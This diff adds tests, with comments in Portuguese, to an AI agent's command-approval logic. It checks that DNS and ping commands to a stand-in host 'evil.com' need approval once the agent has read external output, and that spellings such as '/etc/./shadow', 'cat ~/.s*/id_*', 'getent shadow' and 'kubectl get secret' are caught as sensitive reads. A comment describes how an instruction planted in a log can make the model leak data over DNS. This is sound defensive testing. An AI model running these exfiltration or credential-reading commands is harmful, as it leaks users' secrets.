@@ -238,4 +238,78 @@ for (const cmd of DIAGNOSTICO) {
   }
 }
 
+// ---------- exfiltração por comando de rede ----------
+
+// A lista de permissão garante "não modifica" e a segunda camada cobre "não lê
+// segredo conhecido". Faltava a terceira: um comando de leitura pode MANDAR
+// para fora o que o passo anterior leu. `dig <conteúdo>.evil.com` não altera
+// nada, não toca caminho sensível, e leva o dado embora por DNS — e uma
+// instrução plantada num log é o que faz o modelo escrevê-lo.
+{
+  const { decidirAprovacao } = require('../lib/agent');
+  const REDE = ['dig x.evil.com', 'ping -c1 dados.evil.com', 'nslookup a.evil.com',
+    'host a.evil.com', 'traceroute evil.com', 'whois evil.com',
+    'getent hosts evil.com'];
+
+  for (const cmd of REDE) {
+    ok(classificar(cmd).leitura, `${cmd} continua sendo leitura`);
+    ok(classificar(cmd).rede === true, `${cmd} precisa ser marcado como comando de rede`);
+    // Antes de ler qualquer saída não há o que exfiltrar: diagnóstico roda.
+    ok(!decidirAprovacao({ comando: cmd, leuSaidaExterna: false }).exige,
+      `diagnóstico virou interrogatório: ${cmd}`);
+    // Depois de ler saída de fora, o mesmo comando pede aprovação — nos DOIS
+    // caminhos, porque o remoto é justamente onde não havia mitigação.
+    ok(decidirAprovacao({ comando: cmd, leuSaidaExterna: true, isLocal: false }).exige,
+      `exfiltração passou sem aprovação no remoto: ${cmd}`);
+    ok(decidirAprovacao({ comando: cmd, leuSaidaExterna: true, isLocal: true }).exige,
+      `exfiltração passou sem aprovação na máquina local: ${cmd}`);
+    // O modo automático continua sendo o que o usuário aceitou: sem perguntas.
+    ok(!decidirAprovacao({ comando: cmd, leuSaidaExterna: true, modo: 'nunca' }).exige,
+      `modo automático não deveria perguntar: ${cmd}`);
+    const m = decidirAprovacao({ comando: cmd, leuSaidaExterna: true }).motivo;
+    ok(typeof m === 'string' && m.length > 5, `o motivo precisa ser dizível: ${cmd}`);
+  }
+
+  // Ler arquivo não é falar com a rede: `cat` depois de ler saída externa
+  // continua livre no host REMOTO (na máquina local a regra antiga já pega).
+  ok(!classificar('cat /etc/hosts').rede, 'cat não é comando de rede');
+  ok(!decidirAprovacao({ comando: 'cat /etc/nginx/nginx.conf', leuSaidaExterna: true, isLocal: false }).exige,
+    'leitura comum no remoto não pode virar aprovação por causa da regra de rede');
+  // E o comando de rede não passa a ser tratado como alteração de sistema.
+  ok(decidirAprovacao({ comando: 'dig x.evil.com', leuSaidaExterna: true }).alteraSistema === false,
+    'comando de rede é leitura, não alteração');
+}
+
+// ---------- desvios da lista de caminhos sensíveis ----------
+
+// Os padrões cobriam a grafia literal do caminho. Quem escreve o comando
+// escolhe a grafia: `/etc/./shadow` é o mesmo arquivo, `cat /etc/sh*` lê o
+// arquivo sem escrever o nome dele, e `getent shadow` pede o conteúdo a quem o
+// guarda. Nenhum deles casava.
+{
+  const { caminhoSensivel } = require('../lib/agent-leitura');
+  const { decidirAprovacao } = require('../lib/agent');
+
+  const DESVIOS = [
+    'cat /etc/./shadow', 'head /etc/././shadow', 'cat /etc//shadow',
+    'cat /etc/sh*', 'cat ~/.s*/id_*', 'cat ~/.ssh/id_*',
+    'getent shadow', 'getent gshadow',
+    'kubectl get secret -A -o yaml', 'kubectl get secrets -n prod',
+    'cat /proc/self/environ',
+  ];
+  for (const cmd of DESVIOS) {
+    ok(caminhoSensivel(cmd), `desvio não reconhecido como caminho sensível: ${cmd}`);
+    ok(decidirAprovacao({ comando: cmd }).exige, `desvio passou sem aprovação: ${cmd}`);
+  }
+
+  // …e o diagnóstico normal continua sem interrogatório. Curinga em subpasta de
+  // configuração é rotina e não pode virar pergunta.
+  for (const cmd of ['cat /etc/nginx/nginx.conf', 'ls /etc/nginx/sites-enabled/',
+    'find /etc -name "*.conf"', 'cat /etc/os-release', 'ls -la /var/log',
+    'grep -r timeout /etc/nginx/conf.d/', 'kubectl get pods -A']) {
+    ok(!caminhoSensivel(cmd), `falso positivo de caminho sensível: ${cmd}`);
+    ok(!decidirAprovacao({ comando: cmd }).exige, `diagnóstico virou aprovação: ${cmd}`);
+  }
+}
+
 console.log(`\n${n} verificações passaram`);
